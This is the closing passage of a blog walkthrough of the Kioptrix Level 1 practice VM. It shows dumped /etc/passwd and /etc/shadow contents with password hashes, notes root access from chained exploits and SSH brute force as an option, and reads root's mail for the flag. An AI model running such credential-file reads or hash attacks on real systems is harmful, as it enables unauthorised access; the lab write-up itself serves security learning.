/etc/passwd\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\nnews:x:9:13:news:/var/spool/news:\nuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin\ngopher:x:13:30:gopher:/var/gopher:/sbin/nologin\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:99:99:Nobody:/:/sbin/nologin\nmailnull:x:47:47::/var/spool/mqueue:/dev/null\nrpm:x:37:37::/var/lib/rpm:/bin/bash\nxfs:x:43:43:X Font Server:/etc/X11/fs:/bin/false\nrpc:x:32:32:Portmapper RPC user:/:/bin/false\nrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\nnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin\nnscd:x:28:28:NSCD Daemon:/:/bin/false\nident:x:98:98:pident user:/:/sbin/nolcat /etc/passwd\nogin\nradvd:x:75:75:radvd user:/:/bin/false\npostgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash\napache:x:48:48:Apache:/var/www:/bin/false\nsquid:x:23:23::/var/spool/squid:/dev/null\npcap:x:77:77::/var/arpwatch:/bin/nologin\njohn:x:500:500::/home/john:/bin/bash\nharold:x:501:501::/home/harold:/bin/bash\n\ncat /etc/shadow\nroot:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::\nbin:*:14513:0:99999:7:::\ndaemon:*:14513:0:99999:7:::\nadm:*:14513:0:99999:7:::\nlp:*:14513:0:99999:7:::\nsync:*:14513:0:99999:7:::\nshutdown:*:14513:0:99999:7:::\nhalt:*:14513:0:99999:7:::\nmail:*:14513:0:99999:7:::\nnews:*:14513:0:99999:7:::\nuucp:*:14513:0:99999:7:::\noperator:*:14513:0:99999:7:::\ngames:*:14513:0:99999:7:::\ngopher:*:14513:0:99999:7:::\nftp:*:14513:0:99999:7:::\nnobody:*:14513:0:99999:7:::\nmailnull:!!:14513:0:99999:7:::\nrpm:!!:14513:0:99999:7:::\nxfs:!!:14513:0:99999:7:::\nrpc:!!:14513:0:99999:7:::\nrpcuser:!!:14513:0:99999:7:::\nnfsnobody:!!:14513:0:99999:7:::\nnscd:!!:14513:0:99999:7:::\nident:!!:14513:0:99999:7:::\nradvd:!!:14513:0:99999:7:::\npostgres:!!:14513:0:99999:7:::\napache:!!:14513:0:99999:7:::\nsquid:!!:14513:0:99999:7:::\npcap:!!:14513:0:99999:7:::\njohn:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::\nharold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::\n</code></pre>\n<p>And... Winner, winner, rootshellz for dinner!  By chaining a remote code execution (RCE) exploit with a local privilege escalation exploit we have achieved our goal.</p>\n<h1 id="exploitation3ssh">Exploitation #3 - SSH</h1>\n<p>I couldn\'t seem to identify any exact matches of RCE exploits for OpenSSH 2.9p2.  However, every version of SSH is always vulnerable to at least one exploit: brute force!  I didn\'t spend the time trying to brute force my way in, but it is definitely possible this is a possible solution.</p>\n<h1 id="pillaging">Pillaging</h1>\n<p>Looking through the output of my enumeration script, I noticed something of note:</p>\n<pre><code class="language-shell-output">ls -l /var/mail/\ntotal 1\n-rw-rw----    1 harold   harold          0 Sep 26  2009 harold\n-rw-rw----    1 john     john            0 Sep 26  2009 john\n-rw-rw----    1 nfsnobod nfsnobod        0 Sep 26  2009 nfsnobody\n-rw-------    1 root     root         1005 Aug 16 00:06 root\n</code></pre>\n<p>Mr. root had some mail.</p>\n<pre><code class="language-shell-output">file /var/mail/root\n/var/mail/root: ASCII mail text\n\ncat /var/mail/root\nFrom root  Sat Sep 26 11:42:10 2009\nReturn-Path: &lt;root@kioptix.level1&gt;\nReceived: (from root@localhost)\n  by kioptix.level1 (8.11.6/8.11.6) id n8QFgAZ01831\n  for root@kioptix.level1; Sat, 26 Sep 2009 11:42:10 -0400\nDate: Sat, 26 Sep 2009 11:42:10 -0400\nFrom: root &lt;root@kioptix.level1&gt;\nMessage-Id: &lt;200909261542.n8QFgAZ01831@kioptix.level1&gt;\nTo: root@kioptix.level1\nSubject: About Level 2\nStatus: O\n\nIf you are reading this, you got root. Congratulations.\nLevel 2 won\'t be as easy...\n\nFrom root  Wed Aug 16 00:06:45 2017\nReturn-Path: &lt;root@kioptrix.level1&gt;\nReceived: (from root@localhost)\n  by kioptrix.level1 (8.11.6/8.11.6) id v7G46js01139\n  for root; Wed, 16 Aug 2017 00:06:45 -0400\nDate: Wed, 16 Aug 2017 00:06:45 -0400\nFrom: root &lt;root@kioptrix.level1&gt;\nMessage-Id: &lt;201708160406.v7G46js01139@kioptrix.level1&gt;\nTo: root@kioptrix.level1\nSubject: LogWatch for kioptrix.level1\n\n\n\n ################## LogWatch 2.1.1 Begin ##################### \n\n\n ###################### LogWatch End ######################### \n</code></pre>\n<p>Looks like this was a flag:</p>\n<p>"If you are reading this, you got root. Congratulations.<br>\nLevel 2 won\'t be as easy..."</p>\n<h1 id="conclusion">Conclusion</h1>\n<p>This VM was simple and fun, a nice warm up for the Kioptrix series.  I was able to find two different RCE vulnerabilities, one in SMB and the other in mod_ssl / Apache.  I think the moral here, from a security standpoint, is patch all the things!  Stay tuned as I will continue to post about the Kioptrix series as I complete them.</p>\n<p>Also, in a future posts, I plan to dig deeper in to the exploits used in this and other challenges to really understand the vulnerabilities and how the exploits actually work.</p>\n<!--kg-card-end: markdown-->\n        </section>\n        \n        <div id="disqus_thread"></div>\n        <script type="text/javascript">\n            var disqus_shortname = d_id; \n        \n            /* * * DON\'T EDIT BELOW THIS LINE * * */\n            (function() {\n                var dsq = document.createElement(\'script\'); dsq.type = \'text/javascript\'; dsq.async = true;\n                dsq.src = \'//\' + disqus_shortname + \'.disqus.com/embed.js\';\n                (document.getElementsByTagName(\'head\')[0] || document.getElementsByTagName(\'body\')[0]).appendChild(dsq);\n            })();\n        </script>\n        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>\n        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>\n        \n\n        <footer class="post-footer">\n\n\n            <section class="share">\n                <h4>Share this</h4>\n                <a class="icon-twitter" href="http://twitter.com/share?text=Kioptrix:%20Level%201%20(#1)%20Walkthrough&amp;url=http://localhost:3001/kioptrix-walkthrough-1/" onclick="window.open(this.href, \'twitter-share\', \'width=550,height=235\');return false;">\n                    <span class="hidden">Twitter</span>\n                </a>\n                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:3001/kioptrix-walkthrough-1/" onclick="window.open(this.href, \'facebook-share\',\'width=580,height=296\');return false;">\n                    <span class="hidden">Facebook</span>\n                </a>\n                <a class="icon-google-plus" href="https://plus.google.com/share?url=http://localhost:3001/kioptrix-walkthrough-1/" onclick="window.open(this.href, \'google-plus-share\', \'width=490,height=530\');return false;">\n                    <span class="hidden">Google+</span>\n                </a>\n            </section>\n\n        </footer>\n\n\n    </article>\n\n</main>\n\n    <footer class="site-footer">\n        <!-- <a class="subscribe icon-feed" href="http://localhost:3001/rss/"><span class="tooltip">Subscribe!</span></a> -->\n        <div class="inner">\n             <section class="copyright">All content copyright <a href="../">rootshellz</a> \xc2\xa9 2020 \xe2\x80\xa2 All rights reserved.</section>\n             <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://ghost.org"><span class="icon-ghost-text">Ghost</span></a> in <a href="https://github.com/mityalebedev/The-Shell">The Shell</a> theme.</section>\n        </div>\n    </footer>\n\n    <script type="text/javascript" src="https://rootshellz.github.io/prism.js"></script>\n\n    <script type="text/javascript" src="../assets/highlighter/prettify.js?v=e7e99fee41"></script>\n    <script type="text/javascript" src="../assets/js/shell.js?v=e7e99fee41"></script>\n</body>\n'